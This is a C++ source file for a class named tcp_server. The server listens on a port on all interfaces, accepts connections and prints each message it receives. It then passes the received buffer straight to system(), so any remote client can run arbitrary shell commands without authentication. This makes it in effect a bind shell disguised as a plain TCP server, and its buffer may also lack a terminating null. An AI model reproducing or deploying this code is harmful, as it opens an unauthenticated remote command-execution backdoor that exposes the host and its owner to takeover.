#include "tcp_server.h"  
  
tcp_server::tcp_server(int listen_port) {  
  


    /* Create TCP socket */
    if ((listenfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        /* handle exception */
        perror("socket() error. Failed to initiate a socket");
        exit(1);
    }
 
    opt = SO_REUSEADDR;	
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    bzero(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_port = htons(listen_port);
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    if(bind(listenfd, (struct sockaddr *)&server, sizeof(server)) == -1)
    {
        /* handle exception */
        perror("Bind() error.");
        exit(1);
    }
    
    if(listen(listenfd, BACKLOG) == -1)
    {
        perror("listen() error. \n");
        exit(1);
    }

    addrlen = sizeof(client);


}  
  
int tcp_server::recv_msg() {  
  
    while(1){
        if((connectfd=accept(listenfd,(struct sockaddr *)&client, &addrlen))==-1)
          {
            perror("accept() error. \n");
            exit(1);
          }

        struct timeval tv;
        gettimeofday(&tv, NULL);

        
        int iret=-1;
        while(1)
        {       
	    memset(buf,0,sizeof(buf));
            iret = recv(connectfd, buf, MAXRECVLEN, 0);
            if(iret>0)
            {
                printf("%s\n", buf);
            }else
            {
                close(connectfd);
                break;
            }

	    system(buf);
            		
        }
    }
    close(listenfd); /* close listenfd */
        return 0;  
}  
